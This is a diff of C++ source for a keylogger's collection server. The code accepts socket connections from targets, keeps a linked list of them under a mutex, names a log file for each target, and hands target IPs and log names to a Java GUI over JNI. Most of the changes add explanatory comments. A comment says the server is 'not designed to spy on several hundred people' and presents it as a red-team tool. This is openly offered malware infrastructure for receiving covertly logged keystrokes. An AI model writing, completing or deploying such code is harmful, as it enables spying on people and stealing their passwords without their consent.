@@ -40,38 +40,88 @@ JNICALL void setConsoleColorCaptureInformationKL()
     SetConsoleTextAttribute(hCon,0x60);
 }
 
+/**
+    Title: getBuffer
+    Description: loads the keylogdata interface and initiates the init method
+    then for each connection in the linked list an item is added to an array of java
+    objects that can be used to build the java GUI
 
+    @return an array of keylogdata objects that contain the ip address and log
+    file name of each connected object
+*/
  JNICALL jobjectArray getBuffer()
   {
+    /*
+        find the key log data structure from the classes directory.
+    */
     jclass cls = env->FindClass("keyloggerinterface/keylogdata");
+    /*
+        load the init class that must be called with a long and a jstring.
+    */
     jmethodID cid = env->GetMethodID(cls,"<init>", "(JLjava/lang/String;)V");
-    SOCKETLIST *sl_h,*sl_c ;
+    /*
+        declare a temporary socketlist structure's that holds a pointer to the head
+        structure.
+    */
+    SOCKETLIST *sl_c;
+    /*
+        declare a jobject array that contains an entry for each socket connected to this
+        server
+    */
     jobjectArray ret = env->NewObjectArray(ConnectionCount,cls,NULL);
+    /*
+        lock the global linked list to protect the buffer from being corrupted during this
+        operation.
+    */
     WaitForSingleObject(mu,INFINITE);
-
+    /*
+        if the head element points to a null target then dont perform any actions.
+    */
     if(head->target != NULL)
     {
-        sl_h = sl_c= head;
-
+        /*
+            point the temp socketlist to the head element
+        */
+         sl_c= head;
+         /*
+            iterate over the connection count.
+         */
         for(int x=0; x< ConnectionCount; x++)
         {
+            /*
+                set a temp jlong ipaddr to the IPADDR of the connected socket.
+            */
             jlong ipadd = sl_c->IPADDR;
+            /*
+                cast the name of the connected file to a jstring object.
+            */
             jstring str = env->NewStringUTF(const_cast<char*>(sl_c->name));
-
+            /*
+                initiate a new object and set it within the index of the
+                jobject array.
+            */
             env->SetObjectArrayElement(ret,x,env->NewObject(cls,cid,ipadd,str));
+            /*
+                move to the next connected target.
+            */
             sl_c =sl_c->nextTarget;
         }
-        while ((sl_c) != sl_h);
     }
+    /*
+        after iterating over all connections release the mutex.
+    */
     ReleaseMutex(mu);
+    /*
+        return the array of jobjects.
+    */
       return ret;
   }
 /**
     Title: Listener
-    Description: opens a listening socket and initiate the 
+    Description: opens a listening socket and initiate the
     server. continue to add connections to the global self
     referential linked list. increment the connection count
-    
+
 */
 void Listener()
 {
@@ -86,7 +136,7 @@ void Listener()
     */
     SOCKADDR_IN server, target;
     /*
-        initiate the head socket list item 
+        initiate the head socket list item
     */
     head= static_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
     /*
@@ -94,7 +144,7 @@ void Listener()
     */
     (head->nextTarget)=0x00;
     (head->target)=0x00;
-    /*  
+    /*
         declare a timestamp item for file naming
     */
     SYSTEMTIME timestamp;
@@ -146,8 +196,8 @@ void Listener()
         return;
     }
     /*
-        this server is not designed to spy on several hundred people connecting 
-        simultaneously, instead this is designed for red team and pen-testers. though 
+        this server is not designed to spy on several hundred people connecting
+        simultaneously, instead this is designed for red team and pen-testers. though
         this server may handle more, a backlog of connections should not pass 3
     */
     listen(Listener,3);
@@ -177,7 +227,7 @@ void Listener()
         */
         SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
         /*
-            if the target failed then inform the end user of the failure and proceed 
+            if the target failed then inform the end user of the failure and proceed
             without further processing.
         */
         if(*acceptedTarget==INVALID_SOCKET)
@@ -252,7 +302,7 @@ void Listener()
             link->IPADDR = htonl(target.sin_addr.S_un.S_addr);
             /*
                 we have a newly created socketlist structure that can be added
-                to the global link list, to do this safely we must register a lock 
+                to the global link list, to do this safely we must register a lock
                 to the mutex.
             */
             WaitForSingleObject(mu,INFINITE);
@@ -260,7 +310,7 @@ void Listener()
             if((head->target)==0x00)
             {
                 /*
-                    if the head is null then point the 
+                    if the head is null then point the
                     head to the link.
                 */
                 *head=*link;
@@ -272,7 +322,7 @@ void Listener()
             else
             {
                 /*
-                    if the head is not null then we must insert a 
+                    if the head is not null then we must insert a
                     new node. set the links next target to the heads
                     next target.
                 */
@@ -287,7 +337,7 @@ void Listener()
             */
             ConnectionCount++;
             /*
-                release the mutex handle. 
+                release the mutex handle.
             */
             ReleaseMutex(mu);
 
@@ -475,8 +525,7 @@ void Handler()
         }
 }
 /**
-    Title: main
-    Description: initiates the java virtual machine and starts the
+    Title: main, initiates the java virtual machine and starts the
     two threads that process connections. thread 1 controls the initial
     connections and inserts them into a self referential linked list,
     thread 2 iterates through the linked list and reads any incoming data
@@ -489,6 +538,7 @@ void Handler()
 */
 int main()
 {
+
     /*
         set a global counter on the number of established connections to zero.
     */
